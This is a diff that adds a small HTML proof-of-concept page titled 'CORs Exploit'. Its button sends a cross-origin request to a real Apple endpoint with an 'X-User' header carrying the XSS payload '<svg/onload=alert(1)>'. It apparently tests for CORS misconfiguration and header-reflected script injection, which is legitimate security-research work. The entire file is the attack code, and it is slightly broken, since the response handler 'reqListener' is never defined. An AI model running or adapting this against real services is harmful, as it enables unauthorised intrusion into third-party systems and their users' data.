@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS</title></head>
+<body>
+<center>
+<h2>CORs Exploit</h2>
+
+<textarea rows="10" cols="60" id="pwnz">
+</textarea><br>
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+
+<script>
+function cors() {
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open("GET", "https://xp.apple.com/config/1/report/xp_its_music_main", true);
+  req.setRequestHeader('X-User', '<svg/onload=alert(1)>');
+  req.send();
+}
+</script>
